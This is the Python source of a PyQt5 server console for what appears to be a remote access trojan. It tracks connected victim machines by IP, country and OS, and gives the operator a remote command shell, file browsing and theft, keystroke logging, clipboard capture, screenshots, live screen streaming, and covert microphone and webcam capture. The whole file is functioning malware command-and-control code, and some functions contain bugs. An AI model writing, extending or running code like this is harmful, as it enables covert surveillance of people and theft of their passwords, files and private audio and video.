import sys
import logging
from datetime import datetime
import struct
import cv2
import pickle
import time
import numpy as np
import json
import uuid
import os
import json
import threading
import pyaudio
import qdarkstyle
from PyQt5.QtWidgets import QApplication
from PyQt5.QtWidgets import (QLineEdit, QWidget, 
                             QPushButton,
                             QLabel, QVBoxLayout, 
                             QMessageBox, QTextEdit,
                             QScrollBar, QDialog,
                             QTableWidget, QTableWidgetItem, 
                             QHeaderView, QFileDialog, QListWidget,
                             QProgressBar, QHBoxLayout, QSpacerItem, QSizePolicy)
from PyQt5.QtGui import QIcon, QFont
from PyQt5.QtCore import pyqtSignal, QObject, QThread, pyqtSlot, Qt
from connection_module import SecureConnectionServer

start_port, end_port = 50000, 50100
PORT_RANGE = {port: False for port in range(start_port, end_port + 1)}

CHUNK = 1024  
FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 44100

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler("server_module.log"),
                        logging.StreamHandler(sys.stdout)
                    ])

def find_available_port():
    for port, occupied in PORT_RANGE.items():
        if not occupied:
            return port
    return None

class ScrollableTextInfo(QWidget):
    def __init__(self):
        super(ScrollableTextInfo, self).__init__()
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()
        self.text_edit = QTextEdit()
        self.text_edit.setReadOnly(True)
        self.scroll_bar = QScrollBar()
        layout.addWidget(self.text_edit)
        self.setLayout(layout)
        self.setGeometry(300, 300, 400, 300)
        self.setWindowTitle('Scrollable Text Info')

    def set_text(self, text):
        self.text_edit.setPlainText(text)

class CommandLineWindow(QDialog):
    def __init__(self, parent=None):
        super(CommandLineWindow, self).__init__(parent)
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Command Line Interface')
        self.setGeometry(400, 400, 600, 400)
        layout = QVBoxLayout()
        self.output_text_edit = QTextEdit()
        self.output_text_edit.setReadOnly(True)
        self.input_line_edit = QLineEdit()
        self.input_line_edit.setPlaceholderText("Enter command")
        execute_button = QPushButton("Execute")
        execute_button.clicked.connect(self.execute_command)
        layout.addWidget(self.output_text_edit)
        layout.addWidget(self.input_line_edit)
        layout.addWidget(execute_button)
        self.setLayout(layout)

    def execute_command(self):
        try:
            command = self.input_line_edit.text()
            self.output_text_edit.append(command)
            self.connection.send_data_AES(command.encode("utf-8"))
            if command == "stop":
                self.connection.send_data_AES(b"exit")
                self.close()
                return
            output = self.connection.receive_data_AES().decode("utf-8")
            self.output_text_edit.append(output)
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def show_error_message(self, error_text):
        error_box = QMessageBox()
        error_box.setIcon(QMessageBox.Critical)
        error_box.setText("Error: " + error_text)
        error_box.setWindowTitle("Error Message")
        error_box.exec_()

class Worker(QObject):
    data_ready = pyqtSignal(str, dict)
    client_connections = {}
    
    def handle_clients(self):
        while True:
            available_port = find_available_port()
            try:
                self.secure_server = SecureConnectionServer(ip="0.0.0.0", port=available_port)
                PORT_RANGE[available_port] = True
            except Exception as e:
                PORT_RANGE[available_port] = True
                continue
            client_id = str(uuid.uuid4())
            info_bytes = self.secure_server.receive_data_AES()
            decoded_info = json.loads(info_bytes.decode("utf-8"))
            self.client_connections[client_id] = self.secure_server
            self.data_ready.emit(client_id, decoded_info) 

class ClientMonitorWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()
        self.table_widget = QTableWidget(self)
        self.table_widget.setColumnCount(8)
        self.table_widget.setHorizontalHeaderLabels(["ID", "Connected", "IP", "Country", "OS", "Last Active", "Full System Info", "Use"])
        self.table_widget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.table_widget)
        self.setLayout(layout)
        self.setWindowTitle('Client Monitor')
        self.setGeometry(100, 100, 1280, 720)

        self.server_thread = QThread()
        self.server_worker = Worker()
        self.server_worker.moveToThread(self.server_thread)
        self.server_worker.data_ready.connect(self.update_table)
        self.server_thread.started.connect(self.server_worker.handle_clients)
        self.server_thread.start()

    @pyqtSlot(str, dict)
    def update_table(self, client_id, data):
        ip = data["ip"]

        row_index = self.find_row_by_id(client_id)

        if row_index != -1:
            self.update_client_info(row_index, data)
        else:
            self.add_client_info(client_id, ip, data["country"], data["os"], datetime.now().strftime("%Y-%m-%d %H:%M:%S"), data["systeminfo"])

    def find_row_by_id(self, client_id):
        for row in range(self.table_widget.rowCount()):
            if self.table_widget.item(row, 0).text() == client_id:
                return row
        return -1

    def update_client_info(self, row_index, client_id, data):
        self.table_widget.setItem(row_index, 2, QTableWidgetItem(data["ip"]))
        self.table_widget.setItem(row_index, 3, QTableWidgetItem(data["country"]))
        self.table_widget.setItem(row_index, 4, QTableWidgetItem(data["os"]))
        self.table_widget.setItem(row_index, 5, QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))

        button = self.table_widget.cellWidget(row_index, 6)
        button.clicked.disconnect()
        button.clicked.connect(lambda _, info=data["systeminfo"]: self.show_info_popup(info))

    def add_client_info(self, client_id, ip, country, os, last_active, full_system_info):
        row_position = self.table_widget.rowCount()
        self.table_widget.insertRow(row_position)
        self.table_widget.setItem(row_position, 0, QTableWidgetItem(client_id))
        self.table_widget.setItem(row_position, 2, QTableWidgetItem(ip))
        self.table_widget.setItem(row_position, 3, QTableWidgetItem(country))
        self.table_widget.setItem(row_position, 4, QTableWidgetItem(os))
        self.table_widget.setItem(row_position, 5, QTableWidgetItem(last_active))

        info_button = QPushButton("Info")
        info_button.clicked.connect(lambda _, info=full_system_info: self.show_info_popup(info))
        self.table_widget.setCellWidget(row_position, 6, info_button)

        connect_button = QPushButton("Connect")
        connect_button.clicked.connect(lambda: self.connect(client_id))
        self.table_widget.setCellWidget(row_position, 7, connect_button)

    def connect(self, client_id):
        row_index = self.find_row_by_id(client_id)
        if row_index == -1:
            self.show_error_message(f"Client ID {client_id} not found in table.")
            return

        ip_item = self.table_widget.item(row_index, 2)
        ip = ip_item.text() if ip_item else None
        
        if ip is None:
            self.show_error_message(f"IP address for client ID {client_id} not found.")
            return

        connection = self.server_worker.client_connections.get(client_id, None)
        if connection is None:
            self.show_error_message(f"No connection found for client ID: {client_id}")
            return

        try:
            os = self.table_widget.item(row_index, 4).text() 

            self.server_window = Server(connection, os, ip)
            self.server_window.show()
        except Exception as e:
            self.show_error_message(f"Error connecting to client: {str(e)}")

    def show_info_popup(self, full_system_info):
        self.popup = ScrollableTextInfo()
        self.popup.set_text(full_system_info)
        self.popup.show()

class FileCopyWorker(QObject):
    progress_updated = pyqtSignal(int)
    speed_updated = pyqtSignal(float)
    finished = pyqtSignal(str)

    def __init__(self, connection, src_path, dest_path, mutex):
        super().__init__()
        self.connection = connection
        self.src_path = src_path
        self.dest_path = dest_path
        self.mutex = mutex

    def run(self):
        try:
            with self.mutex:
                self.connection.send_data_AES(b"SND")
                self.connection.send_data_AES(self.src_path.encode("utf-8"))

                file_size = int(self.connection.receive_data_AES().decode("utf-8"))
                received_size = 0
                start_time = time.time()

                with open(self.dest_path, "wb") as file:
                    while True:
                        data = self.connection.receive_data_AES()
                        if data == b"EOF":
                            break
                        elif data.startswith(b"ERROR"):
                            self.finished.emit(data.decode("utf-8"))
                            return
                        file.write(data)
                        received_size += len(data)

                        progress = (received_size / file_size) * 100
                        self.progress_updated.emit(int(progress))

                        elapsed_time = time.time() - start_time
                        speed = (received_size / elapsed_time) / 1024 / 1024
                        self.speed_updated.emit(speed)

            self.finished.emit("File copy completed successfully.")
        except Exception as e:
            self.finished.emit(f"Error: {str(e)}")

class FileBrowserWindow(QWidget):
    def __init__(self, connection):
        super().__init__()
        self.connection = connection
        self.current_path = "/"
        self.mutex = threading.Lock() 
        self.initUI()
        self.list_directory(self.current_path)

    def initUI(self):
        layout = QVBoxLayout()

        self.path_edit = QLineEdit(self)
        self.path_edit.setText(self.current_path)
        self.path_edit.returnPressed.connect(self.change_directory)

        self.list_widget = QListWidget(self)
        self.list_widget.itemDoubleClicked.connect(self.navigate)

        self.copy_button = QPushButton("Copy", self)
        self.copy_button.clicked.connect(self.copy_file)

        self.progress_bar = QProgressBar(self)
        self.progress_bar.setRange(0, 100)

        self.speed_label = QLabel("Speed: 0 KB/s", self)

        layout.addWidget(self.path_edit)
        layout.addWidget(self.list_widget)
        layout.addWidget(self.copy_button)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.speed_label)

        self.setLayout(layout)
        self.setWindowTitle("File Browser")
        self.setGeometry(300, 300, 600, 400)

    def list_directory(self, path):
        try:
            with self.mutex:
                self.connection.send_data_AES(b"LSD")
                self.connection.send_data_AES(path.encode("utf-8"))
                data = self.connection.receive_data_AES()
                if data.startswith(b"ERROR"):
                    self.show_error_message(data.decode("utf-8"))
                    return
                files = pickle.loads(data)
                self.list_widget.clear()
                for file in files:
                    self.list_widget.addItem(file)
        except Exception as e:
            self.show_error_message(f"Error: {str(e)}")

    def change_directory(self):
        self.current_path = self.path_edit.text()
        self.list_directory(self.current_path)

    def navigate(self, item):
        path = os.path.join(self.current_path, item.text())
        if os.path.isdir(path):
            self.current_path = path
            self.path_edit.setText(self.current_path)
            self.list_directory(self.current_path)
        else:
            self.copy_file(path)

    def copy_file(self, path=None):
        if not path:
            item = self.list_widget.currentItem()
            if not item:
                self.show_error_message("No file selected")
                return
            path = os.path.join(self.current_path, item.text())

        save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", item.text(), "All Files (*)")
        if not save_path:
            return

        self.thread = QThread()
        self.worker = FileCopyWorker(self.connection, path, save_path, self.mutex)
        self.worker.moveToThread(self.thread)
        self.worker.progress_updated.connect(self.update_progress_bar)
        self.worker.speed_updated.connect(self.update_speed_label)
        self.worker.finished.connect(self.on_copy_finished)
        self.thread.started.connect(self.worker.run)
        self.thread.start()

    def update_speed_label(self, speed):
        self.speed_label.setText(f"Speed: {speed:.2f} MB/s")

    def update_progress_bar(self, value):
        self.progress_bar.setValue(value)

    def on_copy_finished(self, message):
        self.thread.quit()
        self.thread.wait()
        QMessageBox.information(self, "File Copy Status", message)

    def show_error_message(self, error_text):
        error_box = QMessageBox()
        error_box.setIcon(QMessageBox.Critical)
        error_box.setText(error_text)
        error_box.setWindowTitle("Error")
        error_box.exec_()

class Server(QWidget):
    def __init__(self, connection, os, ip):
        super().__init__()
        self.is_connected = True
        self.connection = connection
        self.connected_ip = ip
        self.initUI()
        self.update_connection_status(os, ip)
    
    def file_browser(self):
        if not self.is_connected:
            self.show_error_message("You are not connected to any client")
            return
        self.file_browser_window = FileBrowserWindow(self.connection)
        self.file_browser_window.show()
    
    def initUI(self):
        self.setWindowTitle('Server Control Panel')
        self.setGeometry(300, 300, 400, 600)
        
        # Main layout
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(15)
        
        # Title label
        title_label = QLabel("Server Operations")
        title_label.setFont(QFont('Arial', 16))
        title_label.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(title_label)
        
        # Button layout
        button_layout = QVBoxLayout()
        button_layout.setSpacing(10)

        button_data = [
            ('System Information', self.gather_system_info, 'info.png'),
            ('CMD', self.command_line_interface, 'cmd.png'),
            ('Remote File Copy', self.remote_file_copy, 'file_copy.png'),
            ('Input Capture', self.input_capture, 'input.png'),
            ('Clipboard Data', self.clipboard_data, 'clipboard.png'),
            ('Screenshot Capture', self.screenshot_capture, 'screenshot.png'),
            ('Audio Capture', self.audio_capture, 'audio.png'),
            ('Video Capture', self.video_capture, 'video.png'),
            ('Screen Capture', self.screen_capture, 'screen.png'),
            ('Stop', self.stop, 'stop.png')
        ]

        for text, function, icon in button_data:
            button = QPushButton(text)
            button.setIcon(QIcon(f'icons/{icon}'))
            button.setMinimumHeight(40)  # Ensure consistent button size
            button.clicked.connect(function)
            button_layout.addWidget(button)

        main_layout.addLayout(button_layout)

        # Add spacer to push connection status to the bottom
        main_layout.addItem(QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding))
        
        # Connection status layout
        connection_status_layout = QHBoxLayout()
        connection_status_label = QLabel("Status: ")
        connection_status_label.setFont(QFont('Arial', 12))

        self.connection_status = QLabel("Not connected")
        self.connection_status.setFont(QFont('Arial', 12))
        self.connection_status.setStyleSheet("color: red;")

        connection_status_layout.addWidget(connection_status_label)
        connection_status_layout.addWidget(self.connection_status)
        connection_status_layout.addStretch()

        main_layout.addLayout(connection_status_layout)

        self.setLayout(main_layout)

    def update_connection_status(self, os, ip):
        status_text = f"Connected: {os}, IP: {ip}"
        self.connection_status.setText(status_text)

    def show_error_message(self, error_text):
        error_box = QMessageBox()
        error_box.setIcon(QMessageBox.Critical)
        error_box.setText("Error: " + error_text)
        error_box.setWindowTitle("Error Message")
        error_box.exec_()

    def remote_file_copy(self):
        self.filebrowser = self.file_browser()

    def input_capture(self):
        KEYSTROKE_FILE = f"keystrokes_{self.connected_ip}.json"
        self.connection.send_data_AES(b"IC")
        keystrokes = self.connection.receive_data_AES().decode("utf-8")
        keystroke_data = json.loads(keystrokes)
        with open(KEYSTROKE_FILE, "w+") as file:
            json.dump(keystroke_data, file, indent=4)

    def clipboard_data(self):
        self.connection.send_data_AES(b"CD")
        clipboard_data_json_bytes = self.connection.receive_data_AES()
        clipboard_data_json = clipboard_data_json_bytes.decode('utf-8')
        self.show_info_popup(clipboard_data_json)

    def screenshot_capture(self):
        self.connection.send_data_AES(b"SCC")
        raw_data = self.connection.receive_data_AES()
        img_np = np.frombuffer(raw_data, dtype=np.uint8).reshape((720, 1280, 3))
        cv2.imshow('Screenshot', img_np)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{self.connected_ip}_{timestamp}.png"
        cv2.imwrite(filename, img_np)

    def audio_capture(self):
        self.connection.send_data_AES(b"AC")
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{self.connected_ip}_{timestamp}.wav"
        wf = open(filename, 'wb')
    
        wf.write(b'RIFF')
        wf.write((0).to_bytes(4, 'little'))  
        wf.write(b'WAVE')
        wf.write(b'fmt ')
        wf.write((16).to_bytes(4, 'little'))  
        wf.write((1).to_bytes(2, 'little'))
        wf.write((CHANNELS).to_bytes(2, 'little')) 
        wf.write((RATE).to_bytes(4, 'little'))  
        wf.write((RATE * CHANNELS * 2).to_bytes(4, 'little'))
        wf.write((CHANNELS * 2).to_bytes(2, 'little'))  
        wf.write((16).to_bytes(2, 'little')) 
        wf.write(b'data')
        wf.write((0).to_bytes(4, 'little'))
        
        try:
            while True:
                data = self.connection.receive_data_AES()
                if not data:
                    break
                stream.write(data)
                wf.write(data)
        finally:
            wf.seek(4)
            file_size = wf.tell() - 8
            wf.write(file_size.to_bytes(4, 'little'))
            
            wf.seek(40)
            data_size = wf.tell() - 44
            wf.write(data_size.to_bytes(4, 'little')) 
    
    def gather_system_info(self):
        try:
            self.connection.send_data_AES(b"SI")
            date = str(datetime.now()).replace(":", "")
            system_info = self.connection.receive_data_AES().decode("utf-8")
            self.system_info_window = ScrollableTextInfo()
            self.system_info_window.set_text(system_info)
            self.system_info_window.show()
            with open("sys_info" + date + ":" + self.connected_ip + ".txt", "w+") as file:
                file.write(system_info)
        except Exception as e:
            self.show_error_message(f"{str(e)}")
        
    def command_line_interface(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send_data_AES(b"CMD")
            self.command_line_window = CommandLineWindow()
            self.command_line_window.connection = self.connection
            self.command_line_window.exec_()
        except Exception as e:
            self.show_error_message(f"{str(e)}")

    def video_capture(self):
        self.connection.send_data_AES(b"VC")
        while True:
            data = self.connection.receive_data_AES()
            frame = pickle.loads(data)
            cv2.imshow('Received Video', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    def screen_capture(self):
        if not self.is_connected:
            self.show_error_message("You are not connected to any client.")
            return
        try:
            self.connection.send_data_AES(b"SC")
            cv2.namedWindow('Screen Video', cv2.WINDOW_NORMAL)
            cv2.resizeWindow('Screen Video', 1280, 720)

            start_time = time.time()
            frame_count = 0

            while True:
                raw_data = self.connection.receive_data_AES()

                if raw_data is not None and len(raw_data) > 0:
                    img_np = np.frombuffer(raw_data, dtype=np.uint8).reshape((720, 1280))

                    frame_count += 1
                    cv2.imshow('Screen Video', img_np)

                    current_time = time.time()
                    if current_time - start_time >= 1:
                        fps = frame_count / (current_time - start_time)
                        logging.info(f"FPS: {fps}")
                        start_time = current_time
                        frame_count = 0

                key = cv2.waitKey(1)
                if key & 0xFF == ord("q"):
                    self.connection.send_data_AES(b"STOP")
                    break
                self.connection.send_data_AES(b"CONTINUE")
        except Exception as e:
            self.show_error_message(str(e))
            raise e

    def show_info_popup(self, info):
        self.popup = ScrollableTextInfo()
        self.popup.set_text(info)
        self.popup.show()

    def stop(self):
        if not self.is_connected:
            self.show_error_message(f"You are not connected to any client")
            return
        try:
            self.connection.send(b"exit")
        except Exception as e:
            self.show_error_message(f"{str(e)}")       

os.environ['PYQTGRAPH_QT_LIB'] = 'PyQt5'

def main():
    app = QApplication([])
    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())
    app.setStyleSheet(qdarkstyle.load_stylesheet(qt_api='pyqt5'))
    server = ClientMonitorWindow()
    server.show()
    return app.exec_()

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        print(f"An error occurred: {e}")